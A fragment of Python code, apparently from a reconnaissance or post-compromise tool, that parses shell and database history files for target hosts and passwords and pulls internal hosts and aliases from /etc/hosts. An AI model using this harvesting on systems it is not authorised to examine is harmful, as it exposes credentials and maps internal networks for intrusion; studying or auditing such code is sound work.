        elif name in ("bash_history", "zsh_history", "python_history",
                      "mysql_history", "psql_history"):
            hosts, _passwords = parse_history_for_targets(text)
            for h in hosts:
                if h not in res.internal_hosts:
                    res.internal_hosts.append(h)
        elif name == "etc_hosts":
            # /etc/hosts: "IP hostname aliases..."
            for line in text.splitlines():
                line = line.strip()
                if not line or line.startswith("#"):
                    continue
                parts = line.split()
                if len(parts) >= 2:
                    ip = parts[0]
                    if ip not in ("127.0.0.1", "::1", "0.0.0.0"):
                        if ip not in res.internal_hosts:
                            res.internal_hosts.append(ip)
                        for alias in parts[1:]:
                            if alias not in ("localhost",) and alias not in res.internal_hosts:
                                res.internal_hosts.append(alias)


parse_pip_packages = _parse_pip_packages
parse_npm_packages = _parse_npm_packages
parse_system_packages = _parse_system_packages